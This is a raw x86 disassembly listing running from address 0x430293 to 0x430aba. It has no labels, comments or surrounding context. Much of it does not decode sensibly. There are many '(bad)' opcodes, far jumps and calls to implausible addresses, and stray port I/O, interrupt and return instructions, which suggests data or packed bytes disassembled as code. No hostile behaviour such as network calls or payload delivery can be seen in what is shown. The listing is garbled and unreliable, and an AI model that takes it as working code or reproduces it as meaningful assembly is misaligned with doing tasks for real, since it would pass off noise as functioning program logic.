  430293:	mov    esi,DWORD PTR [eax]
  430295:	mov    WORD PTR [edi],ss
  430297:	add    BYTE PTR [eax],al
  430299:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43029f:	add    ah,bh
  4302a1:	push   0x7d
  4302a3:	dec    DWORD PTR [ebx+0xd88c]
  4302a9:	push   edx
  4302aa:	mov    edx,DWORD PTR [ecx-0x4]
  4302ad:	call   DWORD PTR [eax+0x7d01fc]
  4302b3:	mov    esi,DWORD PTR [esi]
  4302b5:	cld    
  4302b6:	add    BYTE PTR [eax+0x560150],dl
  4302bc:	test   DWORD PTR [ebp+0x75],eax
  4302bf:	loop   0x43024c
  4302c1:	jmp    0xe38b:0x947dc7fc
  4302c8:	fsub   st,st(7)
  4302ca:	add    bh,al
  4302cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4302d2:	add    edi,edi
  4302d4:	add    bh,bh
  4302d6:	adc    al,0xed
  4302d8:	add    dh,ah
  4302da:	push   eax
  4302db:	inc    ebp
  4302dc:	push   esi
  4302dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4302e3:	test   BYTE PTR [ebx],dh
  4302e5:	out    0x5,al
  4302e7:	shl    BYTE PTR [edx+0x45],0x0
  4302eb:	jmp    0x4302ae
  4302ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4302f4:	inc    esi
  4302f5:	jle    0x4302f7
  4302f7:	test   edi,eax
  4302f9:	(bad)  
  4302fa:	call   0x13003fe
  4302ff:	out    0x75,al
  430301:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430307:	in     al,dx
  430308:	mov    esp,edx
  43030a:	mov    ah,0x85
  43030c:	add    bh,bh
  43030e:	call   0x1292d12
  430313:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43031a:	add    ebx,esp
  43031c:	add    ah,ch
  43031e:	xor    BYTE PTR [ebp-0xff0073],al
  430324:	mov    ebx,ebp
  430326:	cld    
  430327:	jle    0x4302b2
  430329:	add    DWORD PTR gs:[eax],eax
  43032c:	add    BYTE PTR [eax+0x1],dl
  43032f:	inc    ebp
  430330:	inc    ebp
  430331:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430337:	dec    DWORD PTR [ebx-0x3fd80318]
  43033d:	add    BYTE PTR [ebp-0xbf0040],dl
  430343:	inc    ebp
  430344:	fmul   QWORD PTR [ebx-0x4faf0400]
  43034a:	inc    ebp
  43034b:	add    DWORD PTR [ebx+0x459c00],ecx
  430351:	mov    edi,edi
  430353:	mov    eax,0xe80800ff
  430358:	inc    ebp
  430359:	sub    cl,BYTE PTR [ebx-0x47000400]
  43035f:	add    al,0x1
  430361:	rol    BYTE PTR [eax],0x1e
  430364:	jne    0x4303ab
  430366:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43036c:	inc    DWORD PTR [ecx]
  43036e:	call   0x882c73
  430373:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430379:	call   0x432d7f
  43037e:	xor    bh,bh
  430380:	push   edi
  430381:	adc    BYTE PTR [ebx-0x74741bbb],al
  430387:	fsub   st,st(4)
  430389:	ret    
  43038a:	loopne 0x430327
  43038c:	xor    DWORD PTR [edx],0x31
  43038f:	cmp    edi,edi
  430391:	bswap  eax
  430393:	rol    BYTE PTR gs:[eax],0x5
  430397:	jmp    0x12e04e1
  43039c:	mov    eax,DWORD PTR [ebp-0x4]
  43039f:	add    BYTE PTR [eax+0xff0100],bh
  4303a5:	cld    
  4303a6:	jne    0x430425
  4303a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4303ae:	jb     0x4303b1
  4303b0:	add    BYTE PTR [eax],al
  4303b2:	push   eax
  4303b3:	fild   DWORD PTR [ebp+0x0]
  4303b6:	mov    edx,DWORD PTR [eax-0x68]
  4303b9:	inc    ebp
  4303ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4303c0:	or     bh,bh
  4303c2:	inc    ebp
  4303c3:	call   0x1272ac7
  4303c8:	jge    0x430417
  4303ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4303d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4303d6:	fwait
  4303d7:	mov    eax,0x30132
  4303dc:	lea    esi,[ebp+0x2c]
  4303df:	xor    edi,edi
  4303e1:	(bad)  
  4303e2:	call   0x1422d4f
  4303e7:	call   0x1372d77
  4303ec:	jne    0x430379
  4303ee:	xor    edi,esp
  4303f0:	add    eax,DWORD PTR [eax+0xc018d]
  4303f6:	push   DWORD PTR [eax]
  4303f8:	call   0xcc2d54
  4303fd:	enter  0x45ff,0xe0
  430401:	mov    ecx,DWORD PTR [ebp-0x28]
  430404:	xor    eax,DWORD PTR [eax]
  430406:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43040c:	(bad)  
  43040d:	xchg   ebp,eax
  43040e:	call   0x1420512
  430413:	mov    cl,0x45
  430415:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43041b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430422:	mov    edi,edi
  430424:	or     BYTE PTR [eax],cl
  430426:	inc    ebp
  430427:	test   DWORD PTR gs:[eax],eax
  43042a:	je     0x430471
  43042c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430432:	xor    edx,DWORD PTR [eax-0x73]
  430435:	push   ebp
  430436:	or     BYTE PTR [ebp+0x21007572],al
  43043c:	inc    ebp
  43043d:	loopne 0x4303ca
  43043f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430446:	int    0x0
  430448:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43044e:	inc    ebp
  43044f:	push   ebp
  430450:	cmp    ebp,eax
  430452:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430459:	cld    
  43045a:	fadd   QWORD PTR [eax+0x3b014d]
  430460:	jne    0x430492
  430462:	push   0xf8898557
  430467:	loopne 0x4304de
  430469:	inc    ebp
  43046a:	lea    eax,[ebx+0x72e8e4cc]
  430470:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430476:	jmp    0x4304ab
  430478:	mov    edi,DWORD PTR [edi+0x4572bc]
  43047e:	xor    eax,edi
  430480:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43048a:	rcl    BYTE PTR [eax-0x40],1
  43048d:	inc    ebp
  43048e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430496:	inc    ebp
  430497:	xchg   ebp,eax
  430498:	ud0    ebp,DWORD PTR [ebx]
  43049b:	inc    DWORD PTR [eax]
  43049d:	daa    
  43049e:	jbe    0x4304a0
  4304a0:	mov    dl,BYTE PTR [eax-0x80]
  4304a3:	push   ebp
  4304a4:	pop    ds
  4304a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4304a8:	inc    eax
  4304a9:	retf   
  4304aa:	inc    ebp
  4304ab:	iret   
  4304ac:	jb     0x430476
  4304ae:	mov    eax,DWORD PTR [edi]
  4304b0:	int3   
  4304b1:	inc    ebp
  4304b2:	inc    ebp
  4304b3:	add    DWORD PTR [ecx],esi
  4304b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4304bc:	xor    dh,BYTE PTR [ebx]
  4304be:	pushf  
  4304bf:	lea    ecx,[ecx+0x4d72d808]
  4304c5:	add    BYTE PTR [ebx],dh
  4304c7:	inc    ebp
  4304c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4304ce:	xor    dl,BYTE PTR [edx]
  4304d0:	add    eax,DWORD PTR [ebp-0x77]
  4304d3:	mov    eax,esp
  4304d5:	fmul   QWORD PTR [ebp-0x3d]
  4304d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4304df:	mov    DWORD PTR [ebp-0x24],eax
  4304e2:	rol    DWORD PTR [ebp-0x64],1
  4304e5:	xor    eax,edi
  4304e7:	mov    ecx,0xff858db0
  4304ec:	clc    
  4304ed:	enter  0x4d45,0x3c
  4304f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4304f8:	test   esi,edi
  4304fa:	clc    
  4304fb:	inc    DWORD PTR [ebp+0x45]
  4304fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430506:	test   DWORD PTR [ecx],esi
  430508:	clc    
  430509:	pushf  
  43050a:	inc    ebp
  43050b:	(bad)  
  43050c:	cmp    ah,bh
  43050e:	pushf  
  43050f:	inc    ebp
  430510:	mov    edx,DWORD PTR [eax-0x24]
  430513:	add    BYTE PTR [ebp+0x0],dl
  430516:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43051c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430520:	add    al,dl
  430522:	jmp    0x10406f2
  430527:	jb     0x430576
  430529:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43052f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430532:	xor    ecx,DWORD PTR [edi]
  430534:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430538:	(bad)  
  43053a:	clc    
  43053b:	int3   
  43053c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430543:	push   cs
  430544:	xor    ecx,eax
  430546:	xor    esp,ecx
  430548:	add    ebp,DWORD PTR [eax]
  43054a:	add    esi,DWORD PTR [eax]
  43054c:	(bad)  
  43054e:	retf   0x55cc
  430551:	repnz mov eax,DWORD PTR [ebp-0x10]
  430555:	(bad)  
  430556:	cli    
  430557:	fdiv   st(1),st
  430559:	test   DWORD PTR [eax+edi*8],ecx
  43055c:	dec    ebp
  43055d:	inc    ebp
  43055e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430564:	add    BYTE PTR [ebp+0x0],al
  430567:	mov    ecx,DWORD PTR [ebp-0x24]
  43056a:	mov    ecx,ebx
  43056c:	clc    
  43056d:	jne    0x43053a
  43056f:	mov    esi,0xd672d3
  430574:	into   
  430575:	into   
  430576:	scas   eax,DWORD PTR es:[edi]
  430577:	dec    ebp
  430578:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43057e:	sub    ecx,esi
  430580:	cmp    ecx,DWORD PTR [ebp+0x77]
  430583:	(bad)  
  430584:	mov    edi,eax
  430586:	mov    al,0x85
  430588:	mov    eax,edi
  43058a:	add    BYTE PTR [ebp-0x75],al
  43058d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430594:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43059a:	(bad)  
  43059c:	retf   0x559c
  43059f:	(bad)  
  4305a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4305a7:	inc    ebp
  4305a8:	add    eax,0xeb9c4d3f
  4305ad:	(bad)  
  4305ae:	mov    ecx,eax
  4305b0:	lods   al,BYTE PTR ds:[esi]
  4305b1:	test   DWORD PTR [ebp-0x8],edx
  4305b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4305b7:	mov    eax,DWORD PTR [ebx]
  4305b9:	lock add ecx,ebx
  4305bc:	bswap  esi
  4305be:	retf   0x55d1
  4305c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4305c7:	jmp    0x4305c2
  4305c9:	add    BYTE PTR ds:0xebc44d8b,al
  4305cf:	push   ebp
  4305d0:	mov    ebp,DWORD PTR [ebx]
  4305d2:	test   al,0x8b
  4305d4:	push   ebp
  4305d5:	clc    
  4305d6:	xor    ecx,ebx
  4305d8:	xor    ecx,esi
  4305da:	add    edx,ecx
  4305dc:	add    eax,DWORD PTR [edx+0xca010f]
  4305e2:	push   ebp
  4305e3:	dec    ebp
  4305e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4305ea:	stc    
  4305eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4305f1:	scas   eax,DWORD PTR es:[edi]
  4305f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4305f8:	xor    ebp,DWORD PTR [ebx]
  4305fa:	xor    edi,DWORD PTR [ebx]
  4305fc:	add    esi,DWORD PTR [edi+0x3]
  4305ff:	mov    ecx,DWORD PTR [edi]
  430601:	clc    
  430602:	retf   0x55cb
  430605:	into   
  430606:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43060d:	mov    eax,0x3376554d
  430612:	mov    esi,DWORD PTR [ebx]
  430614:	enter  0x5503,0x3
  430618:	xor    ecx,DWORD PTR [edi]
  43061a:	xor    ecx,edx
  43061c:	add    edx,DWORD PTR [ebp+0x3]
  43061f:	mov    ecx,DWORD PTR [edi]
  430621:	lock retf 0x4dfa
  430625:	stc    
  430626:	mov    ecx,DWORD PTR [eax]
  430628:	or     BYTE PTR [ebp+0x4d],cl
  43062b:	jmp    0x10706bb
  430630:	dec    ebp
  430631:	dec    ebp
  430632:	(bad)  
  430633:	mov    esp,esp
  430635:	clc    
  430636:	test   ebx,ecx
  430638:	clc    
  430639:	ror    DWORD PTR [ebp-0x2a],cl
  43063c:	mov    esi,ecx
  43063e:	in     al,dx
  43063f:	scas   eax,DWORD PTR es:[edi]
  430640:	inc    ebp
  430641:	mov    esi,DWORD PTR [ebx]
  430643:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43064a:	retf   
  43064b:	ja     0x43061b
  43064d:	mov    ebp,DWORD PTR [eax-0x48]
  430650:	dec    ebp
  430651:	xor    ecx,DWORD PTR [di+0x3]
  430655:	mov    ebp,eax
  430657:	clc    
  430658:	push   ebp
  430659:	retf   
  43065a:	mov    dl,bl
  43065c:	adc    esi,edx
  43065e:	jb     0x43062e
  430660:	add    BYTE PTR [edi-0x3b7474b3],ch
  430666:	in     al,dx
  430667:	jge    0x430634
  430669:	sub    ecx,DWORD PTR [ebp+0x3b]
  43066c:	mov    esi,DWORD PTR [edi-0x24]
  43066f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430676:	mov    BYTE PTR [ebx-0x34b20729],cl
  43067c:	mov    edx,ebx
  43067e:	in     al,dx
  43067f:	(bad)  
  430680:	ror    esi,cl
  430682:	push   ebp
  430683:	scas   eax,DWORD PTR es:[edi]
  430684:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43068a:	fwait
  43068b:	sub    esi,DWORD PTR [edx]
  43068d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430693:	lods   al,BYTE PTR ds:[esi]
  430694:	xor    esp,DWORD PTR [ebx]
  430696:	add    ecx,DWORD PTR [ebp-0x18]
  430699:	mov    edi,DWORD PTR [ebp-0x8]
  43069c:	mov    bl,cl
  43069e:	cmp    dl,bl
  4306a0:	jb     0x430670
  4306a2:	add    dh,dl
  4306a4:	dec    ebp
  4306a5:	scas   eax,DWORD PTR es:[edi]
  4306a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4306ac:	shr    DWORD PTR [ebx],cl
  4306ae:	into   
  4306af:	cmp    edx,esi
  4306b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4306b7:	dec    ebp
  4306b8:	dec    ebp
  4306b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4306bf:	retf   
  4306c0:	xor    edx,esi
  4306c2:	add    ecx,esi
  4306c4:	imul   ecx,edx
  4306c7:	mov    DWORD PTR [ebp+0x8],edx
  4306ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4306cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4306d3:	add    esi,DWORD PTR [ebx]
  4306d5:	mov    ah,0x3
  4306d7:	inc    ebp
  4306d8:	rdtsc  
  4306da:	xlat   BYTE PTR ds:[ebx]
  4306db:	pushf  
  4306dc:	jge    0x430667
  4306de:	xor    ebx,esp
  4306e0:	sub    eax,DWORD PTR [ebp-0x73]
  4306e3:	(bad)  
  4306e4:	cmp    al,al
  4306e6:	jb     0x43066d
  4306e8:	add    al,bh
  4306ea:	ror    DWORD PTR [ebp-0x7a],1
  4306ed:	xor    edi,edi
  4306ef:	add    edi,edi
  4306f1:	jmp    0x430740
  4306f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4306f9:	dec    ebp
  4306fa:	into   
  4306fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430701:	fwait
  430702:	shl    DWORD PTR [edx],cl
  430704:	retf   0x5588
  430707:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43070d:	add    eax,DWORD PTR [eax]
  43070f:	call   0x8ace5c61
  430714:	fcom   DWORD PTR [ecx]
  430716:	retf   
  430717:	jb     0x43077e
  430719:	add    ch,cl
  43071b:	dec    ebp
  43071c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430722:	dec    ebp
  430723:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430729:	jge    0x4306f9
  43072b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430731:	add    cl,dh
  430733:	dec    ebp
  430734:	dec    DWORD PTR [ebx-0x2c031b75]
  43073a:	adc    BYTE PTR [ebp+0x1],0x8b
  43073e:	add    ah,bl
  430740:	jge    0x4306ce
  430742:	push   0xffffff9b
  430744:	push   0x8b3032
  430749:	shl    BYTE PTR [ebp+0x55],0x6a
  43074d:	xor    edi,edi
  43074f:	xor    edx,DWORD PTR [ebx+eax*1]
  430752:	inc    ebp
  430753:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430759:	dec    ebp
  43075a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430760:	jbe    0x4306ed
  430762:	mov    esp,eax
  430764:	ror    bl,1
  430766:	enter  0x14ce,0xaf
  43076a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430770:	push   ebp
  430771:	retf   0x5540
  430774:	push   ebp
  430775:	mov    esi,DWORD PTR [edx-0x18]
  430778:	mov    edx,ebx
  43077a:	cld    
  43077b:	(bad)  
  43077c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430783:	sti    
  430784:	add    dh,cl
  430786:	push   0xffffff94
  430788:	call   FWORD PTR [ebx+0x3b5032d0]
  43078e:	mov    ecx,DWORD PTR [edi]
  430790:	enter  0x455e,0xff
  430794:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43079a:	xor    esi,DWORD PTR [ebx]
  43079c:	mov    DWORD PTR [ebx],0xcace0f9c
  4307a2:	aas    
  4307a3:	push   ebp
  4307a4:	inc    ebp
  4307a5:	xor    edx,esi
  4307a7:	add    edx,esi
  4307a9:	mov    eax,DWORD PTR [ebx]
  4307ab:	(bad)  
  4307ac:	jmp    0x43073a
  4307ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4307b4:	rol    ah,1
  4307b6:	mov    esi,0xf133104d
  4307bb:	mov    edx,0xff388d80
  4307c0:	mov    dh,0xd1
  4307c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4307c5:	mov    eax,DWORD PTR [edx-0x28]
  4307c8:	add    BYTE PTR [ebp-0x75],bh
  4307cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4307d2:	fwait
  4307d3:	retf   0x8632
  4307d6:	cmp    ebp,0x8
  4307d9:	call   ebx
  4307db:	inc    ebp
  4307dc:	inc    ebp
  4307dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4307e3:	mov    esi,DWORD PTR [ecx]
  4307e5:	int3   
  4307e6:	pushf  
  4307e7:	add    al,0xc7
  4307e9:	add    al,al
  4307eb:	add    bl,al
  4307ed:	(bad)  
  4307ee:	clc    
  4307ef:	int3   
  4307f0:	inc    ebp
  4307f1:	add    BYTE PTR [ecx],dh
  4307f3:	push   eax
  4307f4:	pushf  
  4307f5:	mov    edi,eax
  4307f7:	enter  0xc008,0x85
  4307fb:	aas    
  4307fc:	clc    
  4307fd:	gs inc ebp
  4307ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430805:	push   ss
  430806:	xor    ecx,DWORD PTR [ebp+0x3]
  430809:	sub    edx,DWORD PTR [ecx-0x76]
  43080c:	dec    ebp
  43080d:	add    DWORD PTR [ebx+0x88d845],ecx
  430813:	mov    esi,DWORD PTR [ebx]
  430815:	or     BYTE PTR [ebx],al
  430817:	cmp    edx,DWORD PTR [ecx-0x34]
  43081a:	dec    ebp
  43081b:	out    dx,eax
  43081c:	xor    eax,DWORD PTR [ebp+0x3]
  43081f:	mov    edx,DWORD PTR [ecx-0x28]
  430822:	dec    ebp
  430823:	add    BYTE PTR [ebx],dh
  430825:	push   0x518003
  43082a:	push   eax
  43082b:	add    BYTE PTR [ebx-0x300748b],cl
  430831:	sbb    BYTE PTR [ebp+0x45],cl
  430834:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43083a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430840:	dec    ebp
  430841:	inc    ebp
  430842:	xor    edx,esi
  430844:	add    edx,esi
  430846:	push   ecx
  430847:	(bad)  
  430848:	dec    ebp
  430849:	mov    al,ds:0xc5d83dff
  43084e:	retf   
  43084f:	(bad)  
  430850:	into   
  430851:	sub    bh,bh
  430853:	dec    esp
  430854:	adc    al,0x9c
  430856:	inc    ebp
  430857:	push   ebp
  430858:	test   DWORD PTR [edi],ecx
  43085a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430861:	jmp    0xc9bc1775
  430866:	add    cl,dl
  430868:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430872:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430878:	rol    BYTE PTR [eax],0x54
  43087b:	clc    
  43087c:	gs jb  0x430886
  43087f:	mov    eax,DWORD PTR [ebp-0x30]
  430882:	xor    al,0x40
  430884:	sub    al,0xc7
  430886:	mov    al,ah
  430888:	add    DWORD PTR [ebp+0x4534f845],eax
  43088e:	sub    al,0x80
  430890:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430897:	mov    ch,0xff
  430899:	clc    
  43089a:	add    DWORD PTR [ebp+0x60],0x3d
  43089e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4308a5:	inc    ebp
  4308a6:	dec    DWORD PTR [ebx-0x3427f701]
  4308ac:	test   esi,ecx
  4308ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4308b4:	push   eax
  4308b5:	add    DWORD PTR [ebp+0x0],eax
  4308b8:	dec    ebx
  4308ba:	or     al,0xce
  4308bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4308c3:	into   
  4308c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4308ca:	mov    esi,ecx
  4308cc:	sar    bh,0x45
  4308cf:	adc    al,0x8b
  4308d1:	clc    
  4308d2:	fadd   DWORD PTR [ebp+0x0]
  4308d5:	mov    ebp,DWORD PTR [edx+0x8]
  4308d8:	push   edi
  4308d9:	adc    BYTE PTR [eax+0x1],0x83
  4308dd:	add    al,al
  4308df:	retf   
  4308e0:	mov    ecx,esi
  4308e2:	cld    
  4308e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4308e9:	into   
  4308ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4308f0:	jne    0x430925
  4308f2:	inc    DWORD PTR [ebx]
  4308f4:	rcl    BYTE PTR [ecx+0x50],1
  4308f7:	push   eax
  4308f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4308fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430905:	sar    bh,0x84
  430908:	or     BYTE PTR [ebx],al
  43090a:	push   eax
  43090b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430911:	pushf  
  430912:	xor    edi,eax
  430914:	pushf  
  430915:	mov    ah,0x89
  430917:	test   esp,ebp
  430919:	clc    
  43091a:	inc    ebp
  43091b:	inc    ebp
  43091c:	mov    DWORD PTR [eax+eax*8],esi
  43091f:	sub    al,0x32
  430921:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430928:	dec    ebp
  430929:	xor    eax,DWORD PTR gs:[edi+0x3]
  43092d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430933:	xor    eax,DWORD PTR gs:[edi+0x3]
  430937:	or     DWORD PTR [ecx+0x45ff085c],0x0
  43093e:	shl    DWORD PTR [ebp-0x380064],1
  430944:	enter  0x858d,0x60
  430948:	clc    
  430949:	inc    DWORD PTR [ebp+0x50]
  43094c:	cmp    al,0x75
  43094e:	pushf  
  43094f:	(bad)  
  430950:	(bad)  
  430951:	pop    esp
  430952:	lods   al,BYTE PTR ds:[esi]
  430953:	inc    DWORD PTR [ebp+0x4508f8ff]
  430959:	mov    edi,DWORD PTR [esi]
  43095b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430962:	test   DWORD PTR [edi-0x8],edx
  430965:	sbb    al,0x45
  430967:	add    BYTE PTR [eax],bh
  430969:	push   0x8b809c
  43096e:	loopne 0x4309b5
  430970:	push   ebp
  430971:	mov    esi,DWORD PTR [ebx]
  430973:	cld    
  430974:	add    eax,DWORD PTR [eax+0xf013b]
  43097a:	adc    al,0x0
  43097c:	add    bh,bh
  43097e:	jmp    0xc00a9b
  430983:	add    BYTE PTR [ebp+0x45],cl
  430986:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43098c:	dec    ebp
  43098d:	push   0x38033
  430992:	cmp    eax,DWORD PTR [eax]
  430994:	unpcklps xmm7,xmm0
  430997:	jne    0x430999
  430999:	dec    DWORD PTR [ebx+0x5545c818]
  43099f:	mov    DWORD PTR [ebx],esi
  4309a1:	shl    BYTE PTR [ebx],1
  4309a3:	inc    ebp
  4309a4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  4309aa:	retf   0x5575
  4309ad:	dec    DWORD PTR [ebx-0x5ba13e8]
  4309b3:	(bad)  
  4309b4:	stc    
  4309b5:	loopne 0x4309c3
  4309b7:	test   DWORD PTR [ebp-0x8],ecx
  4309ba:	xor    eax,DWORD PTR [ebp+0x3]
  4309bd:	mov    ebp,ecx
  4309bf:	rol    BYTE PTR [eax],1
  4309c1:	inc    ebp
  4309c2:	add    BYTE PTR [eax-0x7747ab3],bh
  4309c8:	clc    
  4309c9:	inc    ebp
  4309ca:	retf   
  4309cb:	mov    edx,ebx
  4309cd:	loopne 0x4309a5
  4309cf:	retf   
  4309d0:	into   
  4309d1:	into   
  4309d2:	scas   eax,DWORD PTR es:[edi]
  4309d3:	dec    ebp
  4309d4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  4309da:	sub    ecx,esi
  4309dc:	cmp    ecx,DWORD PTR [ebp+0x77]
  4309df:	(bad)  
  4309e0:	mov    edi,eax
  4309e2:	enter  0x8985,0xf8
  4309e6:	add    BYTE PTR [ebp-0x75],al
  4309e9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  4309f0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4309f6:	(bad)  
  4309f8:	retf   0x559c
  4309fb:	(bad)  
  4309fc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a03:	inc    ebp
  430a04:	add    eax,0xeb9c4d3f
  430a09:	(bad)  
  430a0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a10:	xor    ecx,DWORD PTR [ebp+0x33]
  430a13:	mov    eax,DWORD PTR [ebx]
  430a15:	in     al,dx
  430a16:	add    ecx,ebx
  430a18:	bswap  esi
  430a1a:	retf   0x55d1
  430a1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430a23:	jmp    0x430a1e
  430a25:	add    BYTE PTR ds:0xebf44d8b,al
  430a2b:	push   ebp
  430a2c:	mov    ebp,DWORD PTR [ebx]
  430a2e:	mov    eax,0x33f8558b
  430a33:	retf   
  430a34:	xor    ecx,esi
  430a36:	add    edx,ecx
  430a38:	add    eax,DWORD PTR [edx+0xca010f]
  430a3e:	push   ebp
  430a3f:	dec    ebp
  430a40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430a46:	stc    
  430a47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430a4d:	scas   eax,DWORD PTR es:[edi]
  430a4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430a54:	xor    ebp,DWORD PTR [ebx]
  430a56:	xor    edi,DWORD PTR [ebx]
  430a58:	add    esi,DWORD PTR [edi+0x3]
  430a5b:	mov    ecx,DWORD PTR [edi]
  430a5d:	clc    
  430a5e:	retf   0x55cb
  430a61:	into   
  430a62:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430a69:	test   al,0x4d
  430a6b:	push   ebp
  430a6c:	jbe    0x430aa1
  430a6e:	mov    esi,DWORD PTR [ebx]
  430a70:	mov    al,0x3
  430a72:	push   ebp
  430a73:	add    esi,DWORD PTR [ebx]
  430a75:	rdpmc  
  430a77:	retf   0x5503
  430a7a:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a80:	dec    ebp
  430a81:	stc    
  430a82:	mov    ecx,DWORD PTR [eax]
  430a84:	or     BYTE PTR [ebp+0x4d],cl
  430a87:	jmp    0x1370b17
  430a8c:	dec    ebp
  430a8d:	dec    ebp
  430a8e:	(bad)  
  430a8f:	mov    esp,esp
  430a91:	clc    
  430a92:	test   ebx,ecx
  430a94:	clc    
  430a95:	ror    DWORD PTR [ebp-0x2a],cl
  430a98:	mov    esi,ecx
  430a9a:	lock scas eax,DWORD PTR es:[edi]
  430a9c:	inc    ebp
  430a9d:	mov    esi,DWORD PTR [ebx]
  430a9f:	hlt    
  430aa0:	pushf  
  430aa1:	jge    0x430a2e
  430aa3:	sub    esp,esp
  430aa5:	cmp    ecx,ebx
  430aa7:	ja     0x430a77
  430aa9:	mov    ebp,DWORD PTR [eax-0x58]
  430aac:	dec    ebp
  430aad:	xor    ecx,DWORD PTR [di+0x3]
  430ab1:	mov    ebp,eax
  430ab3:	clc    
  430ab4:	push   ebp
  430ab5:	retf   
  430ab6:	mov    dl,bl
  430ab8:	adc    esi,edx
  430aba:	jb     0x430a8a
